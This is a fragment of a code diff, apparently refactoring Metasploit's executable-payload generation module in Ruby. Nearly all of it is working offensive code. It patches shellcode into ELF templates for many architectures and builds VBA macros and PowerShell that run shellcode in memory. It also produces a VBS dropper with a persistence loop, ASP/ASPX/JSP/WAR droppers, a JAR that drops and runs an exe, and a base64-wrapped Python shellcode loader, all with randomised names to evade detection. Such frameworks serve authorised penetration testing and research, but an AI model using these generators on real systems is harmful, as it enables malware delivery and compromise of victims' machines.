+        if default
+          elf = to_exe_elf(framework, opts, 'template_x86_linux.bin', code)
+        else
+          # Use set_template_default to normalize the :template key. It will just end up doing
+          # opts[:template] = File.join(opts[:template_path], opts[:template])
+          # for us, check if the file exists.
+          set_template_default(opts, 'template_x86_linux.bin')
 
-    # put the shellcode bytes into an array
-    hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])
+          # If this isn't our normal template, we have to do some fancy
+          # header patching to mark the .text section rwx before putting our
+          # payload into the entry point.
 
-    read_replace_script_template("to_mem.vba.template", hash_sub)
-  end
+          # read in the template and parse it
+          e = Metasm::ELF.decode_file(opts[:template])
 
-  # self.to_powershell_vba
-  #
-  # @param framework  [Msf::Framework]
-  # @param arch       [String]
-  # @param code       [String]
-  #
-  def self.to_powershell_vba(framework, arch, code)
-    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+          # This will become a modified copy of the template's original phdr
+          new_phdr = Metasm::EncodedData.new
+          e.segments.each do |s|
+            # Be lazy and mark any executable segment as writable.  Doing
+            # it this way means we don't have to care about which one
+            # contains .text
+            s.flags += [ 'W' ] if s.flags.include? 'X'
+            new_phdr << s.encode(e)
+          end
 
-    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
-                    arch,
-                    template_path,
-                    encode_final_payload: true,
-                    remove_comspec: true,
-                    method: 'reflection')
+          # Copy the original file
+          elf = get_file_contents(opts[:template], 'rb')
 
-    # Initialize rig and value names
-    rig = Rex::RandomIdentifier::Generator.new()
-    rig.init_var(:sub_auto_open)
-    rig.init_var(:var_powershell)
+          # Replace the header with our rwx modified version
+          elf[e.header.phoff, new_phdr.data.length] = new_phdr.data
 
-    hash_sub = rig.to_h
-    # VBA has a maximum of 24 line continuations
-    line_length = powershell.length / 24
-    vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
+          # Replace code at the entrypoint with our payload
+          entry_off = e.addr_to_off(e.label_addr('entrypoint'))
+          elf[entry_off, code.length] = code
+        end
 
-    hash_sub[:powershell] = vba_psh
+        elf
+      end
 
-    read_replace_script_template("to_powershell.vba.template", hash_sub)
-  end
+      # Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_bsd_x86_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x86_bsd.bin', code)
+      end
 
-  # self.to_exe_vba
-  #
-  # @param  exes  [String]
-  # @param  opts  [Hash]
-  # @option opts  [String] :delay
-  # @option opts  [String] :persists
-  # @option opts  [String] :exe_filename
-  def self.to_exe_vbs(exes = '', opts = {})
-    delay   = opts[:delay]   || 5
-    persist = opts[:persist] || false
+      # Create a 64-bit Linux ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_bsd_x64_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x64_bsd.bin', code)
+      end
 
-    hash_sub = {}
-    hash_sub[:exe_filename]  = opts[:exe_filename] || Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
-    hash_sub[:base64_filename]  = Rex::Text.rand_text_alpha(rand(8)+8) << '.b64'
-    hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_fname]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_func]      = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_obj]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shell]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:base64_shellcode] = Rex::Text.encode_base64(exes)
-    hash_sub[:var_decodefunc] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_xml] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_xmldoc] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_decoded] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_adodbstream] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_decodebase64] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:init] = ""
+      # Create a 32-bit Solaris ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_solaris_x86_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x86_solaris.bin', code)
+      end
 
-    if persist
-      hash_sub[:init] << "Do\r\n"
-      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
-      hash_sub[:init] << "WScript.Sleep #{delay * 1000}\r\n"
-      hash_sub[:init] << "Loop\r\n"
-    else
-      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
-    end
+      # Create a 64-bit Linux ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_x64_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x64_linux.bin', code)
+      end
 
-    read_replace_script_template("to_exe.vbs.template", hash_sub)
-  end
+      # Create a 32-bit Linux ELF_DYN containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_x86_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x86_linux_dll.bin', code)
+      end
 
-  # self.to_exe_asp
-  #
-  # @param exes [String]
-  # @param opts [Hash]    Unused
-  def self.to_exe_asp(exes = '', opts = {})
-    hash_sub = {}
-    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
-    read_replace_script_template("to_exe.asp.template", hash_sub)
-  end
+      # Create a AARCH64 Linux ELF_DYN containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_aarch64_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_aarch64_linux_dll.bin', code)
+      end
 
-  # self.to_exe_aspx
-  #
-  # @param  exes [String]
-  # @option opts [Hash]
-  def self.to_exe_aspx(exes = '', opts = {})
-    hash_sub = {}
-    hash_sub[:var_file]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:shellcode] = Rex::Text.to_csharp(exes,100,hash_sub[:var_file])
-    read_replace_script_template("to_exe.aspx.template", hash_sub)
-  end
+      # Create a 64-bit Linux ELF_DYN containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_x64_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_x64_linux_dll.bin', code)
+      end
 
-  def self.to_mem_aspx(framework, code, exeopts = {})
-    # Initialize rig and value names
-    rig = Rex::RandomIdentifier::Generator.new()
-    rig.init_var(:var_funcAddr)
-    rig.init_var(:var_hThread)
-    rig.init_var(:var_pInfo)
-    rig.init_var(:var_threadId)
-    rig.init_var(:var_bytearray)
+      # self.to_linux_armle_elf
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_armle_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_armle_linux.bin', code)
+      end
 
-    hash_sub = rig.to_h
-    hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])
+      # self.to_linux_armle_elf_dll
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf-so
+      def self.to_linux_armle_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_armle_linux_dll.bin', code)
+      end
 
-    read_replace_script_template("to_mem.aspx.template", hash_sub)
-  end
+      # self.to_linux_aarch64_elf
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_aarch64_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_aarch64_linux.bin', code)
+      end
 
-  def self.to_win32pe_psh_net(framework, code, opts={})
-    Rex::Powershell::Payload.to_win32pe_psh_net(Rex::Powershell::Templates::TEMPLATE_DIR, code)
-  end
+      # self.to_linux_ppc64le_elf
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_ppc64le_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_ppc64le_linux.bin', code)
+      end
 
-  def self.to_win32pe_psh(framework, code, opts = {})
-    Rex::Powershell::Payload.to_win32pe_psh(Rex::Powershell::Templates::TEMPLATE_DIR, code)
-  end
+      # self.to_linux_ppc_elf
+      #
+      # @param framework [msf::framework]
+      # @param code       [string]
+      # @param opts       [hash]
+      # @option           [string] :template
+      # @return           [string] returns an elf
+      def self.to_linux_ppc_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_ppc_linux.bin', code, true)
+      end
 
-  #
-  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
-  # Tweaked by shellster
-  # Originally from PowerSploit
-  #
-  def self.to_win32pe_psh_reflection(framework, code, opts = {})
-    Rex::Powershell::Payload.to_win32pe_psh_reflection(Rex::Powershell::Templates::TEMPLATE_DIR, code)
-  end
+      # self.to_linux_ppce500v2_elf
+      #
+      # @param framework [msf::framework]
+      # @param code       [string]
+      # @param opts       [hash]
+      # @option           [string] :template
+      # @return           [string] returns an elf
+      def self.to_linux_ppce500v2_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_ppce500v2_linux.bin', code, true)
+      end
 
-  def self.to_powershell_command(framework, arch, code)
-    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
-    Rex::Powershell::Command.cmd_psh_payload(code,
-                    arch,
-                    template_path,
-                    encode_final_payload: true,
-                    method: 'reflection')
-  end
+      # self.to_linux_mipsle_elf
+      # Little Endian
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_mipsle_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_mipsle_linux.bin', code)
+      end
 
-  def self.to_powershell_ducky_script(framework, arch, code)
-    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
-    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
-                    arch,
-                    template_path,
-                    encode_final_payload: true,
-                    method: 'reflection')
-    replacers = {}
-    replacers[:var_payload] = powershell
-    read_replace_script_template("to_powershell.ducky_script.template", replacers)
-  end
+      # self.to_linux_mipsbe_elf
+      # Big Endian
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_mipsbe_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_mipsbe_linux.bin', code, true)
+      end
 
-  def self.to_powershell_hta(framework, arch, code)
-    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
+      # Create a RISC-V 64-bit LE Linux ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_riscv64le_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_riscv64le_linux.bin', code)
+      end
 
-    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
-                    arch,
-                    template_path,
-                    encode_final_payload: true,
-                    remove_comspec: true,
-                    method: 'reflection')
+      # Create a RISC-V 64-bit LE Linux ELF_DYN containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_riscv64le_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_riscv64le_linux_dll.bin', code)
+      end
 
-    # Initialize rig and value names
-    rig = Rex::RandomIdentifier::Generator.new()
-    rig.init_var(:var_shell)
-    rig.init_var(:var_fso)
+      # Create a RISC-V 32-bit LE Linux ELF containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_riscv32le_elf(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_riscv32le_linux.bin', code)
+      end
 
-    hash_sub = rig.to_h
-    hash_sub[:powershell] = powershell
+      # Create a RISC-V 32-bit LE Linux ELF_DYN containing the payload provided in +code+
+      #
+      # @param framework [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_riscv32le_elf_dll(framework, code, opts = {})
+        to_exe_elf(framework, opts, 'template_riscv32le_linux_dll.bin', code)
+      end
 
-    read_replace_script_template("to_powershell.hta.template", hash_sub)
-  end
+      # self.to_exe_vba
+      #
+      # @param exes [String]
+      def self.to_exe_vba(exes = '')
+        exe = exes.unpack('C*')
+        hash_sub = {}
+        idx = 0
+        maxbytes = 2000
+        var_base_idx = 0
+        var_base = Rex::Text.rand_text_alpha(5).capitalize
 
-  def self.to_python_reflection(framework, arch, code, exeopts)
-    unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
-      raise RuntimeError, "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
-    end
-    python_code = <<~PYTHON
-      #{Rex::Text.to_python(code)}
-      import ctypes,os
-      if os.name == 'nt':
-       cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
-       ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-       ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
-       ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
-       ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
-       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
-      else:
-       import mmap
-       from ctypes.util import find_library
-       c = ctypes.CDLL(find_library('c'))
-       c.mmap.restype = ctypes.c_void_p
-       ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
-       ctypes.memmove(ptr,buf,len(buf))
-       c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
-       c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
-       ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
-    PYTHON
+        # First write the macro into the vba file
+        hash_sub[:var_magic] = Rex::Text.rand_text_alpha(10).capitalize
+        hash_sub[:var_fname] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_fenvi] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_fhand] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_parag] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_itemp] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_btemp] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_appnr] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_index] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_gotmagic] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_farg] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:var_stemp] = var_base + (var_base_idx += 1).to_s
+        hash_sub[:filename] = Rex::Text.rand_text_alpha(rand(8..15))
 
-    "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
-  end
+        # Function 1 extracts the binary
+        hash_sub[:func_name1] = var_base + (var_base_idx += 1).to_s
 
-  def self.to_win32pe_psh_msil(framework, code, opts = {})
-    Rex::Powershell::Payload.to_win32pe_psh_msil(Rex::Powershell::Templates::TEMPLATE_DIR, code)
-  end
+        # Function 2 executes the binary
+        hash_sub[:func_name2] = var_base + (var_base_idx + 1).to_s
 
-  def self.to_win32pe_psh_rc4(framework, code, opts = {})
-    # unlike other to_win32pe_psh_* methods, this expects powershell code, not asm
-    # this method should be called after other to_win32pe_psh_* methods to wrap the output
-    Rex::Powershell::Payload.to_win32pe_psh_rc4(Rex::Powershell::Templates::TEMPLATE_DIR, code)
-  end
+        hash_sub[:data] = ''
 
-  def self.to_jsp(exe)
-    hash_sub = {}
-    hash_sub[:var_payload]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_exepath]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_outputstream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_payloadlength] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_bytes]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_counter]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_exe]           = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_proc]          = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_fperm]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_fdel]          = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_exepatharray]  = Rex::Text.rand_text_alpha(rand(8)+8)
+        # Writing the bytes of the exe to the file
+        1.upto(exe.length) do |_pc|
+          while (c = exe[idx])
+            hash_sub[:data] << "&H#{('%.2x' % c).upcase}"
+            if idx > 1 && (idx % maxbytes) == 0
+              # When maxbytes are written make a new paragrpah
+              hash_sub[:data] << "\r\n"
+            end
+            idx += 1
+          end
+        end
 
-    payload_hex = exe.unpack('H*')[0]
-    hash_sub[:payload]           = payload_hex
+        read_replace_script_template('to_exe.vba.template', hash_sub)
+      end
 
-    read_replace_script_template("to_exe.jsp.template", hash_sub)
-  end
+      # self.to_vba
+      #
+      # @param framework  [Msf::Framework]
+      # @param code       [String]
+      # @param opts       [Hash]    Unused
+      def self.to_vba(framework, code, opts = {})
+        hash_sub = {}
+        hash_sub[:var_myByte] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_myArray] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_rwxpage] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_res] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_offset] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_dwStackSize] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lpStartAddress] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lpParameter] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_dwCreationFlags] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lpThreadID] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lpAddr] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lSize] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_flAllocationType] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_flProtect] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_lDest] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_Source] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
+        hash_sub[:var_Length] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
 
-  # Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
-  # payload.  The jsp page converts the hexdump back to a normal binary file
-  # and places it in the temp directory. The payload file is then executed.
-  #
-  # @see to_war
-  # @param exe [String] Executable to drop and run.
-  # @param opts (see to_war)
-  # @option opts (see to_war)
-  # @return (see to_war)
-  def self.to_jsp_war(exe, opts = {})
-    template = self.to_jsp(exe)
-    self.to_war(template, opts)
-  end
+        # put the shellcode bytes into an array
+        hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])
 
-  def self.to_win32pe_vbs(framework, code, opts = {})
-    to_exe_vbs(to_win32pe(framework, code, opts), opts)
-  end
+        read_replace_script_template('to_mem.vba.template', hash_sub)
+      end
 
-  def self.to_win64pe_vbs(framework, code, opts = {})
-    to_exe_vbs(to_win64pe(framework, code, opts), opts)
-  end
+      # self.to_powershell_vba
+      #
+      # @param framework  [Msf::Framework]
+      # @param arch       [String]
+      # @param code       [String]
+      #
+      def self.to_powershell_vba(framework, arch, code)
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
 
-  # Creates a jar file that drops the provided +exe+ into a random file name
-  # in the system's temp dir and executes it.
-  #
-  # @see Msf::Payload::Java
-  #
-  # @return [Rex::Zip::Jar]
-  def self.to_jar(exe, opts = {})
-    spawn = opts[:spawn] || 2
-    exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
-    zip = Rex::Zip::Jar.new
-    zip.add_sub("metasploit") if opts[:random]
-    paths = [
-      [ "metasploit", "Payload.class" ],
-    ]
+        powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                                                              arch,
+                                                              template_path,
+                                                              encode_final_payload: true,
+                                                              remove_comspec: true,
+                                                              method: 'reflection')
 
-    zip.add_file('metasploit/', '')
-    paths.each do |path_parts|
-      path = ['java', path_parts].flatten.join('/')
-      contents = ::MetasploitPayloads.read(path)
-      zip.add_file(path_parts.join('/'), contents)
-    end
+        # Initialize rig and value names
+        rig = Rex::RandomIdentifier::Generator.new
+        rig.init_var(:sub_auto_open)
+        rig.init_var(:var_powershell)
 
-    zip.build_manifest :main_class => "metasploit.Payload"
-    config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
-    zip.add_file("metasploit.dat", config)
-    zip.add_file(exe_name, exe)
+        hash_sub = rig.to_h
+        # VBA has a maximum of 24 line continuations
+        line_length = powershell.length / 24
+        vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
 
-    zip
-  end
+        hash_sub[:powershell] = vba_psh
 
-  # Creates a Web Archive (WAR) file from the provided jsp code.
-  #
-  # On Tomcat, WAR files will be deployed into a directory with the same name
-  # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
-  # server is in a default configuration, deoployment will happen
-  # automatically. See
-  # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
-  # documentation} for a description of how this works.
-  #
-  # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
-  #   in the archive. This will be compiled by the victim servlet container
-  #   (e.g., Tomcat) and act as the main function for the servlet.
-  # @param opts [Hash]
-  # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
-  #   _without the .jsp extension_. Defaults to random.
-  # @option opts :app_name [String] Name of the app to put in the <servlet-name>
-  #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
-  #   random.
-  # @option opts :extra_files [Array<String,String>] Additional files to add
-  #   to the archive. First element is filename, second is data
-  #
-  # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
-  #
-  # @return [String]
-  def self.to_war(jsp_raw, opts = {})
-    jsp_name = opts[:jsp_name]
-    jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
-    app_name = opts[:app_name]
-    app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
+        read_replace_script_template('to_powershell.vba.template', hash_sub)
+      end
 
-    meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
-    manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
-    web_xml = %q{<?xml version="1.0"?>
+      # self.to_exe_vba
+      #
+      # @param  exes  [String]
+      # @param  opts  [Hash]
+      # @option opts  [String] :delay
+      # @option opts  [String] :persists
+      # @option opts  [String] :exe_filename
+      def self.to_exe_vbs(exes = '', opts = {})
+        delay = opts[:delay] || 5
+        persist = opts[:persist] || false
+
+        hash_sub = {}
+        hash_sub[:exe_filename] = opts[:exe_filename] || Rex::Text.rand_text_alpha(rand(8..15)) << '.exe'
+        hash_sub[:base64_filename] = Rex::Text.rand_text_alpha(rand(8..15)) << '.b64'
+        hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_fname] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_func] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_obj] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_shell] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:base64_shellcode] = Rex::Text.encode_base64(exes)
+        hash_sub[:var_decodefunc] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_xml] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_xmldoc] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_decoded] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_adodbstream] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_decodebase64] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:init] = ''
+
+        if persist
+          hash_sub[:init] << "Do\r\n"
+          hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
+          hash_sub[:init] << "WScript.Sleep #{delay * 1000}\r\n"
+          hash_sub[:init] << "Loop\r\n"
+        else
+          hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
+        end
+
+        read_replace_script_template('to_exe.vbs.template', hash_sub)
+      end
+
+      # self.to_exe_asp
+      #
+      # @param exes [String]
+      # @param opts [Hash]    Unused
+      def self.to_exe_asp(exes = '', opts = {})
+        hash_sub = {}
+        hash_sub[:var_bytes] = Rex::Text.rand_text_alpha(rand(4..7)) # repeated a large number of times, so keep this one small
+        hash_sub[:var_fname] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_func] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_stream] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_obj] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_shell] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
+        read_replace_script_template('to_exe.asp.template', hash_sub)
+      end
+
+      # self.to_exe_aspx
+      #
+      # @param  exes [String]
+      # @option opts [Hash]
+      def self.to_exe_aspx(exes = '', opts = {})
+        hash_sub = {}
+        hash_sub[:var_file] = Rex::Text.rand_text_alpha(rand(8..15))
